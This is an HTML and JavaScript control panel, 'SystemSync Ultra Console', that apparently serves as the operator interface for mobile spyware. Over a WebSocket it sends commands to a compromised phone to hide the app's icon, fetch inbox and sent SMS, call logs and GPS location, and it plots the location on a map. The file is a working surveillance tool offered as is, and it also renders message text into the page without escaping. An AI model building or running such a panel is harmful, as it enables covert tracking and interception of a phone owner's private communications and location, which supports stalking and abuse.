<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>SystemSync Ultra Console</title>

<link rel="stylesheet"
 href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    background:radial-gradient(circle at top,#0a0a0a,#000);
    color:#e6e6e6;
    font-family:'Segoe UI',system-ui;
    height:100vh;
    display:flex;
    flex-direction:column;
}

/* HEADER */

.header{
    height:65px;
    background:rgba(20,20,20,.9);
    backdrop-filter:blur(10px);
    border-bottom:1px solid #111;
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:0 25px;
}

.status-badge{
    padding:6px 14px;
    border-radius:20px;
    font-weight:600;
}

.online{
    background:#062d12;
    color:#5cff91;
}

.offline{
    background:#3a0606;
    color:#ff7b7b;
}

.net-info{
    font-family:monospace;
    color:#00d2ff;
}

/* LAYOUT */

.main{
    flex:1;
    display:flex;
}

/* CONTROL PANEL */

.panel{
    width:320px;
    background:linear-gradient(180deg,#111,#050505);
    border-right:1px solid #111;
    padding:25px;
}

.panel-title{
    font-size:20px;
    color:#00d2ff;
    margin-bottom:25px;
}

/* BUTTONS */

button{
    width:100%;
    padding:12px;
    margin-bottom:10px;
    border:none;
    border-radius:10px;
    cursor:pointer;
    font-weight:600;
    letter-spacing:.5px;
    background:#151515;
    color:#fff;
    transition:.25s;
}

button:hover{
    transform:translateY(-2px);
    background:#1f1f1f;
}

/* TOGGLE */

.toggle-on{
    background:linear-gradient(90deg,#00d2ff,#3a7cff);
}

.toggle-off{
    background:linear-gradient(90deg,#ff3b3b,#ff6b6b);
}

/* MOBILE FRAME */

.viewer{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
}

.phone{
    width:380px;
    height:700px;
    border-radius:40px;
    padding:12px;
    background:
        linear-gradient(145deg,#1a1a1a,#000);
    box-shadow:
        0 0 60px rgba(0,210,255,.12),
        inset 0 0 25px rgba(255,255,255,.02);
}

.screen{
    width:100%;
    height:100%;
    border-radius:28px;
    background:#000;
    overflow:hidden;
    position:relative;
}

/* DATA */

.data-card{
    background:#141414;
    margin:10px;
    padding:10px;
    border-radius:10px;
    border-left:3px solid #00d2ff;
}

.label{
    color:#777;
    font-size:12px;
}

#map{
    height:100%;
}

.gps-info{
    position:absolute;
    top:0;
    width:100%;
    background:rgba(0,0,0,.8);
    padding:8px;
    font-size:12px;
}

</style>
</head>

<body>

<div class="header">
    <div id="connectionStatus" class="status-badge offline">
        DEVICE: OFFLINE
    </div>

    <div id="networkInfo" class="net-info">
        WAITING FOR NETWORK DATA...
    </div>
</div>

<div class="main">

<!-- CONTROL PANEL -->
<div class="panel">

<div class="panel-title">
âš¡ SystemSync Control
</div>

<button id="toggleAppBtn"
        class="toggle-on"
        onclick="toggleApp()">
Hide App
</button>

<button onclick="sendCommand('getSMS inbox')">
Inbox SMS
</button>

<button onclick="sendCommand('getSMS sent')">
Sent SMS
</button>

<button onclick="sendCommand('getCallLogs')">
Call Logs
</button>

<button onclick="sendCommand('getLocation')">
GPS Location
</button>

</div>

<!-- MOBILE FRAME -->
<div class="viewer">

<div class="phone">
<div class="screen">

<div id="outputContent"
     style="color:#444;
     display:flex;
     justify-content:center;
     align-items:center;
     height:100%;">
Select an option to view data
</div>

</div>
</div>

</div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

const ws = new WebSocket("wss://" + window.location.host);
let mapInstance=null;
let appHidden=false;

/* TOGGLE BUTTON */

function toggleApp(){

    if(appHidden){
        sendCommand('showApp');
        toggleAppBtn.innerText="Hide App";
        toggleAppBtn.className="toggle-on";
    }else{
        sendCommand('hideApp');
        toggleAppBtn.innerText="Show App";
        toggleAppBtn.className="toggle-off";
    }

    appHidden=!appHidden;
}

/* SOCKET */

ws.onopen=()=>{
    ws.send("I_AM_WEB");
};

ws.onmessage=(event)=>{

    const msg=event.data;

    if(msg.startsWith("STATUS:")){
        const status=msg.split(":")[1];
        const badge=document.getElementById('connectionStatus');

        badge.className=
            status==='ONLINE'
            ?'status-badge online'
            :'status-badge offline';

        badge.innerText="DEVICE: "+status;
    }

    else if(msg.startsWith("NET_INFO:")){
        networkInfo.innerText=msg.split(":")[1];
    }

    else if(msg.startsWith("SMS_DATA:")){
        renderSMS(JSON.parse(msg.substring(9)));
    }

    else if(msg.startsWith("CALL_DATA:")){
        renderCalls(JSON.parse(msg.substring(10)));
    }

    else if(msg.startsWith("LOC_DATA:")){
        renderLocation(JSON.parse(msg.substring(9)));
    }
};

/* COMMAND */

function sendCommand(cmd){
    ws.send(cmd);
    outputContent.innerHTML=
        '<div style="padding:20px;">Fetching...</div>';
}

/* SMS */

function renderSMS(data){

    outputContent.innerHTML="";

    data.forEach(sms=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
        <div><span class="label">FROM:</span> ${sms.number}</div>
        <div>${sms.content}</div>
        <div class="label">${sms.date}</div>
        `;

        outputContent.appendChild(card);
    });
}

/* CALLS */

function renderCalls(data){

    outputContent.innerHTML="";

    data.forEach(call=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
        <div><span class="label">NUMBER:</span> ${call.number}</div>
        <div><span class="label">DURATION:</span> ${call.duration}</div>
        <div class="label">${call.date}</div>
        `;

        outputContent.appendChild(card);
    });
}

/* GPS */

function renderLocation(data){

    outputContent.innerHTML="";

    if(data.error){
        outputContent.innerHTML=data.error;
        return;
    }

    const info=document.createElement('div');
    info.className='gps-info';
    info.innerHTML=`
    LAT: ${data.lat} |
    LON: ${data.lon} |
    ACC: ${data.acc}m
    `;

    outputContent.appendChild(info);

    const mapDiv=document.createElement('div');
    mapDiv.id="map";
    outputContent.appendChild(mapDiv);

    setTimeout(()=>{

        if(mapInstance) mapInstance.remove();

        mapInstance=L.map('map')
            .setView([data.lat,data.lon],15);

        L.tileLayer(
            'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
        ).addTo(mapInstance);

        L.marker([data.lat,data.lon]).addTo(mapInstance);

        L.circle([data.lat,data.lon],{
            radius:data.acc
        }).addTo(mapInstance);

    },100);
}

</script>
</body>
</html>
